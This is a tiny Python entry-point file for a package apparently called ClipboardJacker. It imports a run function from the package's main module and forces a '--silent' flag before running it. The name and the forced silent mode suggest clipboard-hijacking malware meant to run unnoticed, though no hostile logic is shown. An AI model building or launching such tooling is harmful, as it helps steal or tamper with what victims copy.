#!/usr/bin/env python3
"""
Entry point for ClipboardJacker package
"""

import sys
from clipboardjacker.main import run_clipboard_jacker

if __name__ == '__main__':
    # Add --silent flag to arguments
    sys.argv.append('--silent')
    run_clipboard_jacker()
